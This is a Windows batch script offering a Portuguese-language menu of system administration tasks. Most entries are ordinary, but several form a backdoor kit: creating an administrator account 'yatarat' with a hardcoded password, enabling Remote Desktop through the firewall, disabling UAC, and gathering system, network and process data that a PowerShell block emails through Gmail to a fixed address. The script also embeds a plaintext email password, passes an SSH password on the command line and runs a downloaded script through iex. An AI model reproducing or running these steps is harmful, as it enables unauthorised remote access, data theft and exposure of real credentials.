@echo off
:menu
cls
echo =============================================================================================
echo					Pannel-YataTools                                            
echo =============================================================================================
color 0F
echo 1. Acessar via SSH (UmbrelOS)
echo 2. Verificar Conexao com PING
echo 3. Abrir o Bloco de Notas
echo 4. Exibir Configuracao IP
echo 5. Listar Dispositivos na Rede Local
echo 6. Verificar Portas Abertas (Netstat)
echo 7. Exibir Tempo de Atividade (Uptime)
echo 8. Exibir Usuarios Conectados
echo 9. Exibir Tarefas Ativas (Tasklist)
echo 10. Matar Processo Especifico
echo 11. Limpar Cache DNS
echo 12. Monitorar Uso de Memoria e CPU
echo 13. Testar Conexao HTTP (curl)
echo 14. Criar Backup de Arquivos
echo 15. Verificar Espaco em Disco
echo 16. Exibir Logs de Eventos do Sistema
echo 17. Ver Adaptadores de Rede Ativos
echo 18. Exibir Informacoes do Sistema
echo 19. Exibir Processos com Filtro
echo 20. Exibir Variaveis de Ambiente
echo 21. Hibernar o Computador
echo 22. Verificar Conectividade com DNS
echo 23. Baixar Aplicativos (winget)
echo 24. Instalar Chocolatey
echo 25. Instalar Aplicativos (Chocolatey)
echo 26. Limpar Tela
echo 27. Desligar o Computador
echo 28. Reiniciar o Computador
echo 29. Executar BAT Externa
echo 30. Limpar TEMP
echo 31. Instalar Kit DEV
echo 32. Criptografar/Descriptografar Disco (BitLocker)
echo 33. Criar usuario administrador yatarat
echo 34. Habilitar Area de Trabalho Remota
echo 35. Desabilitar UAC
echo 36. Coletar e Enviar Informacoes da Maquina por E-mail
echo 37. Sair
echo =============================================================================================
color 0F
set /p escolha="Digite a opcao desejada: "

if "%escolha%"=="1" goto ssh
if "%escolha%"=="2" goto ping
if "%escolha%"=="3" goto notepad
if "%escolha%"=="4" goto ipconfig
if "%escolha%"=="5" goto listar_rede
if "%escolha%"=="6" goto netstat
if "%escolha%"=="7" goto uptime
if "%escolha%"=="8" goto users
if "%escolha%"=="9" goto tasklist
if "%escolha%"=="10" goto killprocess
if "%escolha%"=="11" goto flushdns
if "%escolha%"=="12" goto monitor
if "%escolha%"=="13" goto curltest
if "%escolha%"=="14" goto backup
if "%escolha%"=="15" goto diskspace
if "%escolha%"=="16" goto eventlog
if "%escolha%"=="17" goto networkadapters
if "%escolha%"=="18" goto sysinfo
if "%escolha%"=="19" goto filterprocess
if "%escolha%"=="20" goto envvars
if "%escolha%"=="21" goto hibernate
if "%escolha%"=="22" goto dnscheck
if "%escolha%"=="23" goto installapp
if "%escolha%"=="24" goto install_chocolatey
if "%escolha%"=="25" goto install_chocolatey_app
if "%escolha%"=="26" goto clear
if "%escolha%"=="27" goto shutdown
if "%escolha%"=="28" goto restart
if "%escolha%"=="29" goto executar_bat
if "%escolha%"=="30" goto limpar_temp
if "%escolha%"=="31" goto kit_dev
if "%escolha%"=="32" goto bitlocker
if "%escolha%"=="33" goto admin_yatarat
if "%escolha%"=="34" goto habilitar_rdp
if "%escolha%"=="35" goto desabilitar_uac
if "%escolha%"=="36" goto coletar_enviar_info
if "%escolha%"=="37" goto sair

echo Opcao invalida, tente novamente.
pause
goto menu

:ssh
cls
echo Conectando via SSH...
set /p ip="Digite o IP da maquina para acessar via SSH: "
if "%ip%"=="" (
    echo Nenhum IP foi inserido.
    pause
    goto menu
)
set /p user="Digite o nome de usuario (padrao: umbrel): "
if "%user%"=="" set user=umbrel
set /p password="Digite a senha SSH: "
echo Tentando conectar via SSH em %user%@%ip%...
pause
sshpass -p %password% ssh %user%@%ip%
if errorlevel 1 (
    echo Falha ao conectar via SSH.
    pause
) else (
    echo Conexao via SSH encerrada.
    pause
)
goto menu

:ping
cls
echo Verificando conexao com PING...
set /p ip="Digite o IP para verificar a conectividade: "
ping %ip%
pause
goto menu

:notepad
cls
echo Abrindo o Bloco de Notas...
notepad
pause
goto menu

:ipconfig
cls
echo Exibindo configuracao IP...
ipconfig
pause
goto menu

:listar_rede
cls
echo Listando dispositivos na rede local...
arp -a
pause
goto menu

:netstat
cls
echo Exibindo portas abertas e conexoes de rede...
netstat -an
pause
goto menu

:uptime
cls
echo Exibindo tempo de atividade do sistema...
systeminfo | find "Tempo de inicializacao do sistema"
pause
goto menu

:users
cls
echo Exibindo usuarios conectados...
query user
pause
goto menu

:tasklist
cls
echo Exibindo tarefas ativas...
tasklist
pause
goto menu

:killprocess
cls
echo Encerrando um processo especifico...
set /p proc="Digite o nome ou PID do processo para encerrar: "
taskkill /F /IM %proc% /T
pause
goto menu

:flushdns
cls
echo Limpando o cache DNS...
ipconfig /flushdns
pause
goto menu

:monitor
cls
echo Monitorando uso de memoria e CPU...
wmic cpu get loadpercentage
wmic OS get FreePhysicalMemory /Value
pause
goto menu

:curltest
cls
echo Testando conexao HTTP com curl...
set /p url="Digite a URL para testar: "
curl -I %url%
pause
goto menu

:backup
cls
echo Criando backup de arquivos...
set /p source="Digite o caminho do arquivo para backup: "
set /p destination="Digite o caminho de destino para o backup: "
copy %source% %destination%
if errorlevel 1 (
    echo Falha ao criar o backup.
) else (
    echo Backup criado com sucesso.
)
pause
goto menu

:diskspace
cls
echo Verificando espaco em disco...
wmic logicaldisk get size,freespace,caption
pause
goto menu

:eventlog
cls
echo Exibindo logs de eventos do sistema...
wevtutil qe System /c:10 /f:text
pause
goto menu

:networkadapters
cls
echo Exibindo adaptadores de rede ativos...
ipconfig | findstr "IPv4"
pause
goto menu

:sysinfo
cls
echo Exibindo informacoes do sistema...
systeminfo | findstr /C:"Nome do sistema operacional" /C:"Arquitetura"
pause
goto menu

:filterprocess
cls
echo Exibindo processos filtrados...
set /p filter="Digite o nome do processo a ser filtrado: "
tasklist | findstr /I %filter%
pause
goto menu

:envvars
cls
echo Exibindo variaveis de ambiente...
set
pause
goto menu

:hibernate
cls
echo Hibernando o sistema...
shutdown /h
exit

:dnscheck
cls
echo Testando conectividade com o DNS (8.8.8.8)...
ping 8.8.8.8
pause
goto menu

:installapp
cls
echo Instalando aplicativo via winget...
set /p appname="Digite o nome do aplicativo para baixar: "
winget install %appname%
if errorlevel 1 (
    echo Falha ao instalar o aplicativo.
) else (
    echo Aplicativo %appname% instalado com sucesso.
)
pause
goto menu

:install_chocolatey
cls
echo Instalando Chocolatey...
set "cmd=@"^"echo Installing Chocolatey... & powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" & echo Chocolatey installed successfully!^""
cmd /C %cmd%
pause
goto menu

:install_chocolatey_app
cls
echo Instalando aplicativo via Chocolatey...
set /p appname="Digite o nome do aplicativo para instalar: "
choco install %appname% -y
if errorlevel 1 (
    echo Falha ao instalar o aplicativo.
) else (
    echo Aplicativo %appname% instalado com sucesso.
)
pause
goto menu

:clear
cls
echo Tela limpa.
pause
goto menu

:shutdown
cls
echo Desligando o computador...
shutdown /s /f /t 0
exit

:restart
cls
echo Reiniciando o computador...
shutdown /r /f /t 0
exit

:executar_bat
cls
echo Executando outro arquivo .bat...
set /p caminho_bat="Digite o caminho completo do arquivo .bat: "
call "%caminho_bat%"
pause
goto menu

:limpar_temp
cls
echo Limpando a pasta Temp...
del /q /f "%temp%\*"
echo Limpeza concluída!
pause
goto menu

:kit_dev
cls
echo Instalando kit de desenvolvimento...

:: Verificar se o Chocolatey esta instalado
choco -v >nul 2>&1
if %errorlevel% neq 0 (
    echo Instalando o Chocolatey...
    set "cmd=@"^"echo Installing Chocolatey... & powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;   
 iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"   
 & echo Chocolatey installed successfully!^""
    cmd /C %cmd%
)

:: Instalar as ferramentas usando o Chocolatey
choco install vscode python git wsl --yes

:: Instalar extensoes para o VS Code (opcional)
choco install vscode-extension.ms-azuretools.vscode-azurefunctions --yes

echo Kit de desenvolvimento instalado com sucesso!
pause
goto menu

:bitlocker
cls
echo Criptografia/Descriptografia de Disco (BitLocker)
echo 1. Ativar BitLocker
echo 2. Desativar BitLocker
set /p opcao_bitlocker="Digite a opcao desejada: "

if "%opcao_bitlocker%"=="1" (
    set /p unidade="Digite a letra da unidade a ser criptografada (ex: C): "
    manage-bde -on %unidade%
) else if "%opcao_bitlocker%"=="2" (
    set /p unidade="Digite a letra da unidade a ser descriptografada (ex: C): "
    manage-bde -off %unidade%
) else (
    echo Opção inválida.
    pause
    goto bitlocker
)
pause
goto menu


:admin_yatarat
cls
echo Criando usuario administrador yatarat...
powershell -Command "Net user yatarat 94895255rc /add"
powershell -Command "Net localgroup Administradores yatarat /add"
echo Usuario yatarat criado com sucesso e adicionado ao grupo de administradores.
pause
goto menu

:habilitar_rdp
cls
echo Habilitando a Area de Trabalho Remota...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Área de Trabalho Remota" new enable=Yes
echo Area de Trabalho Remota habilitada com sucesso.
pause
goto menu

:desabilitar_uac
cls
echo Desabilitando o UAC (Controle de Conta de Usuario)...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
echo UAC desabilitado com sucesso. E necessario reiniciar o computador para aplicar as alteracoes.
pause
goto menu

:coletar_enviar_info
cls
echo Coletando informacoes da maquina...

:: Criando arquivo temporário para armazenar as informações
set "temp_file=%temp%\machine_info.txt"

:: Coletando informações
echo Informacoes da Maquina > "%temp_file%"
echo ======================== >> "%temp_file%"
echo. >> "%temp_file%"

echo Informacoes do Sistema: >> "%temp_file%"
systeminfo | findstr /C:"Nome do sistema operacional" /C:"Versão do sistema operacional" /C:"Fabricante do sistema" /C:"Modelo do sistema" /C:"Tipo de sistema" /C:"Processador(es)" /C:"Memória física total" >> "%temp_file%"

echo. >> "%temp_file%"
echo Informacoes de Rede: >> "%temp_file%"
ipconfig /all >> "%temp_file%"

echo. >> "%temp_file%"
echo Processos em Execucao: >> "%temp_file%"
tasklist >> "%temp_file%"

echo. >> "%temp_file%"
echo Espaco em Disco: >> "%temp_file%"
wmic logicaldisk get deviceid,volumename,size,freespace >> "%temp_file%"

echo Informacoes coletadas. Enviando por e-mail...

:: Enviando e-mail usando PowerShell
powershell -Command "& {
    $EmailFrom = 'washingtonrcoha.dev@gmail.com'
    $EmailTo = 'washingtonrcoha.dev@gmail.com'
    $Subject = 'Informacoes da Maquina'
    $Body = 'Segue em anexo as informacoes da maquina.'
    $SMTPServer = 'smtp.gmail.com'
    $SMTPPort = 587
    $Username = 'seu_email@gmail.com'
    $Password = '94895255Rc@#Wash'

    $Attachment = '%temp_file%'

    $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
    $Attachment = New-Object System.Net.Mail.Attachment($Attachment)
    $SMTPMessage.Attachments.Add($Attachment)

    $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    Try {
        $SMTPClient.Send($SMTPMessage)
        Write-Host 'E-mail enviado com sucesso!'
    }
    Catch {
        Write-Host 'Erro ao enviar e-mail: ' $_.Exception.Message
    }

    $Attachment.Dispose()
}"

:: Removendo o arquivo temporário
del "%temp_file%"

echo Processo concluido.
pause
goto menu

:sair
echo Saindo...
exit
